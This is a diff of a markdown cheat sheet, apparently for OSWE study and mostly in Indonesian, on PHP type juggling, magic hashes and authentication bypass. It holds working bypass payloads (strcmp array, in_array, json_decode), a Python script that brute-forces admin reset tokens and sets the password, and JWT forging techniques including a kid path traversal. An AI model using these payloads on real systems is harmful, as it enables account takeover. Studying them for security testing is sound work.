@@ -1,162 +1,148 @@
 ---
 name: "PHP Type Juggling & Authentication Bypass"
-description: "PHP loose vs strict comparison, magic hashes, strcmp() vulnerability, in_array() bypass, type juggling with json_decode(), weak random token generation, logic flaw auth bypass, JWT algorithm confusion, and session hijacking."
-tags: [oswe, php, type-juggling, magic-hash, authentication-bypass, jwt, weak-random, strcmp]
+description: "Loose vs strict comparison, magic hash, strcmp(array) dan in_array longgar dengan gerbang versi PHP 7/8, json_decode, token lemah (mt_rand/java.util.Random), logic flaw reset password, JWT (none, RS256→HS256, kid/jku), dan sesi."
+tags: [oswe, php, type-juggling, magic-hash, authentication-bypass, jwt, weak-random, strcmp, session]
 ---
 
 ## PHP Type Juggling & Authentication Bypass
 
+> Gerbang versi menentukan segalanya. PHP 8 mengubah perbandingan string–angka, tetapi **tidak** mengubah bool vs string. Klaim "type juggling selalu jalan" adalah tanda belum cek `php -v`.
+
 ### PHP Loose vs Strict Comparison
 
-| Operator | Name | Behavior |
-|----------|------|----------|
-| `==` | Loose (equal) | Type coercion: `"0e123" == "0"` |
-| `===` | Strict (identical) | No coercion: type + value must match |
-| `!=` | Loose (not equal) | Type coercion |
-| `!==` | Strict (not identical) | No coercion |
-| `strcmp($a, $b)` | String compare | Returns 0 if equal, null if array → `null == 0` |
-| `in_array($a, $b)` | Loose by default | Type coercion unless third param `true` |
-| `switch($a)` | Loose comparison | Coercion in case matching |
+| Operator | Perilaku |
+|---|---|
+| `==` | coercion tipe: `"0e123" == "0"` benar (keduanya numeric string) |
+| `===` | tipe + nilai harus sama |
+| `strcmp($a,$b)` | 0 jika sama; `NULL` bila argumen array (**PHP < 8**) |
+| `in_array($a,$b)` | longgar kecuali parameter ketiga `true` |
+| `switch($a)` | perbandingan longgar pada `case` |
+
+**PHP 8.0**: `0 == "foo"` → `false`, `0 == ""` → `false`, `42 == "42foo"` → `false`; `"0e1" == "0e2"` tetap `true` (keduanya numeric string). Aturan yang sama berlaku untuk `switch`.
 
 ### Magic Hashes
 
-Ketika string di-hash dan hasilnya dimulai dengan `0e` diikuti digit saja, PHP akan menginterpretasikannya sebagai float `0` dalam loose comparison:
+Hash yang seluruhnya `0e` + digit diperlakukan sebagai float `0` pada loose comparison.
 
 ```php
-// Jika hash tersimpan adalah "0e462097431907509062..."
-// Dan hash input adalah "0e077701784189519..."
-// Maka: "0e462..." == "0e077..." → TRUE (keduanya == float 0)
+md5('240610708')  → 0e462097431906509019562988736854
+md5('QNKCDZO')    → 0e830400451993494058024219903391
+md5('0e215962017')→ 0e291242476940776845150308577824
+sha1('aaroZmOk')  → 0e66507019969427134894567494305185566735
+sha1('aaK1STfY')  → 0e76658526655756207688271159624026011393
 ```
 
-**Known magic hashes**:
-```php
-// MD5 magic hashes
-md5('240610708')  → 0e462097431907509062...
-md5('QNKCDZO')    → 0e830400451993494058...
-md5('byGcY')      → 0e591948146276357475...
-md5('0e215962017') → 0e291242476940776848...
+Berlaku bila kedua operand string numeric atau dibandingkan dengan `0`. Mati dengan `===`, `password_verify()`, `hash_equals()`, atau penyimpanan biner.
 
-// SHA1 magic hashes
-sha1('aaroZmOk')  → 0e665070199694271348...
-sha1('aaK1STfY')  → 0e766585266557562076...
-sha1('aaO8zKZF')  → 0e892574566772790685...
-```
-
-### strcmp() Vulnerability
+### strcmp() dengan array
 
 ```php
-<?php
-$stored_hash = "admin_hash";
-if (strcmp($_POST['password'], $stored_hash) == 0) {
-    echo "Access granted!";
-}
-// Attack: kirim password[]=foo (array)
-// strcmp(array, string) → NULL → NULL == 0 → TRUE
-?>
+if (strcmp($_POST['password'], $stored_hash) == 0) { }
+// PHP 7: strcmp(array, string) → NULL + warning → NULL == 0 → TRUE
+// PHP 8: TypeError → 500, bukan bypass
 ```
 
-```python
-import requests
-r = requests.post(TARGET, data={"username": "admin", "password[]": "anything"})
-```
+Jika error handler mengubah warning menjadi exception, bypass PHP 7 juga mati.
 
-### In_array() Vulnerability
+### in_array() longgar
 
 ```php
-<?php
 $allowed_roles = ["user", "editor", "admin"];
-if (in_array($_POST['role'], $allowed_roles)) {
-    // Grant role
-}
-// Attack: role=0 → in_array('0', ["user", "editor", "admin"]) → TRUE
-// Karena 'user' == 0 → TRUE (string to int coercion)
-?>
+if (in_array($_POST['role'], $allowed_roles)) { /* grant */ }
 ```
 
-### Type Juggling with json_decode()
+| Payload | PHP 7 | PHP 8 |
+|---|---|---|
+| `role=0` | `true` (`"user" == 0`) | `false` |
+| `role=true` | `true` | `true` (bool vs string → string jadi bool) |
+| `role=0e1` | `true` | `false` |
+
+Uji `role=true` sebelum menyimpulkan versi; kirim `role=0` hanya bila target terbukti PHP 7.
+
+### Type juggling dengan json_decode
 
 ```php
-<?php
 $data = json_decode($_POST['data'], true);
-$expected_admin = "false";
-
-if ($data['isAdmin'] == $expected_admin) {
-    // Not admin
-} else {
-    // Has admin access!
-}
-// Attack: {"isAdmin": true} → true == "false"? PHP coerces: (int)true = 1, (int)"false" = 0
-// 1 != 0 → else → admin!
-?>
+if ($data['role'] == 'admin') { /* admin */ }
+// {"role": true}  → true == "admin" → "admin" truthy → TRUE (PHP 7 & 8)
+// {"role": 1}     → 1 == "admin"   → FALSE (PHP 8); PHP 7 juga false
 ```
 
-### Weak Random Token Generation
+Contoh yang sering beredar — `true == "false"` → `FALSE` — **salah**: PHP membandingkan bool vs string dengan meng-cast string ke bool, sehingga `true == "false"` bernilai `TRUE` ("false" non-kosong). Jangan pakai pola itu sebagai bypass; gunakan `== 'admin'` dengan `{"role":true}`.
+
+### Token lemah
 
 ```java
-// VULNERABLE — java.util.Random is predictable
+// VULNERABLE — java.util.Random diprediksi dari beberapa output
 Random rand = new Random();
 String token = String.format("%06d", rand.nextInt(999999));
 
-// SECURE — java.security.SecureRandom
+// SECURE
 SecureRandom rand = new SecureRandom();
-byte[] tokenBytes = new byte[32];
-rand.nextBytes(tokenBytes);
+byte[] tokenBytes = new byte[32]; rand.nextBytes(tokenBytes);
 ```
 
 ```php
-// VULNERABLE — mt_rand() seed can be cracked
+// VULNERABLE — mt_rand() dapat di-seed ulang
 $token = mt_rand(100000, 999999);
-
-// SECURE — random_bytes()
+// SECURE
 $token = bin2hex(random_bytes(32));
 ```
 
+`php_mt_seed` membutuhkan seed yang diketahui/ditebak (waktu, `mt_srand`). Satu token tidak cukup untuk `java.util.Random`; butuh beberapa output berurutan. `uniqid()` berbasis microtime; UUID v4 aman, UUID v1 bergantung node.
+
 ```python
-# Password reset token bruteforce (6-digit)
+# Brute 6 digit — hanya masuk akal tanpa rate limit dan tanpa expiry
 for i in range(1000000):
-    token = f"{i:06d}"
-    r = requests.post(TARGET + "/reset.php", data={"username": "admin", "token": token, "new_password": "pwned123"})
+    r = requests.post(TARGET + "/reset.php", data={"username": "admin", "token": f"{i:06d}", "new_password": "pwned123"})
     if "success" in r.text:
-        print(f"Token found: {token}")
-        break
+        print("Token:", f"{i:06d}"); break
 ```
 
-### Logic Flaw Authentication Bypass
+### Logic flaw reset password
 
 ```php
-<?php
-// Vulnerability: Step 3 doesn't verify that Step 2 was completed
+// Langkah 3 tidak memeriksa bahwa langkah 2 sudah selesai
 if ($_POST['action'] === 'change_password') {
-    $username = $_POST['username'];
-    $new_password = $_POST['new_password'];
-    // Missing: check if token was verified!
     $query = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
 }
-?>
 ```
 
-```python
-# Skip directly to step 3
-r = requests.post(TARGET + "/reset.php", data={
-    "action": "change_password", "username": "admin", "new_password": "pwned123"
-})
-```
+Cek di source: flag `verified` disimpan server-side, token terikat user, expiry, dan apakah langkah bisa dilewati.
 
-### JWT Algorithm Confusion
+### JWT
 
-```python
-import jwt
-# Attack: algorithm none
-token = jwt.encode({"user": "admin", "role": "administrator"}, key="", algorithm="none")
-# Server-side: jwt.decode(token, verify=False) ← insecure!
-```
+| Serangan | Kondisi | Catatan |
+|---|---|---|
+| `alg: none` | verifikasi dimatikan / algoritma dari header | butuh signature kosong + trailing dot; library modern menolak |
+| RS256 → HS256 | aplikasi memakai public key untuk semua alg | public key harus identik byte; banyak library menolak |
+| `kid` | `kid` masuk path/SQL | `../../../../dev/null` + sign kosong, atau SQLi untuk memilih secret |
+| `jku`/`x5u` | server mengambil JWKS dari URL | butuh whitelist host yang lemah |
+| Secret lemah | HMAC dengan secret pendek | `hashcat -m 16500` |
 
-### Session Hijacking via Weak Session ID
+`alg: none` hanya bekerja bila library/konfigurasi mengizinkannya; jangan berasumsi dari nama parameter.
+
+### Sesi
 
 ```php
-<?php
-// Predictable: same IP + User-Agent → same session!
+// ID dapat diprediksi
 session_id(md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));
 session_start();
-?>
 ```
+
+Default PHP: `use_strict_mode=0`, `use_only_cookies=1`, `cookie_httponly=0`, `cookie_secure=0`, `cookie_samesite=""`. Session fixation hidup bila tidak ada `session_regenerate_id(true)` setelah login; `use_strict_mode=1` mencegah adopsi ID, bukan fixation setelah login.
+
+### Best Practices
+
+- Cek `php -v`/`composer.lock` sebelum memilih payload; catat versi di bukti.
+- Uji `role=true` dan strict comparison sebagai negatif control.
+- Jangan klaim bypass dari `strcmp` di PHP 8.
+- Simpan request/response mentah dan perubahan state, bukan hanya status 200.
+- Bedakan CORS misconfiguration dari CSRF; keduanya punya prasyarat berbeda.
+
+### Rujukan
+
+- php.net: comparison operators, migration80, `in_array`, `strcmp`, `mt_rand`, session configuration.
+- PortSwigger: JWT, algorithm confusion, CORS, CSRF.
+- Openwall `php_mt_seed`.
+- [waf-bypass-payloads.md](./waf-bypass-payloads.md) — bila payload difilter WAF.
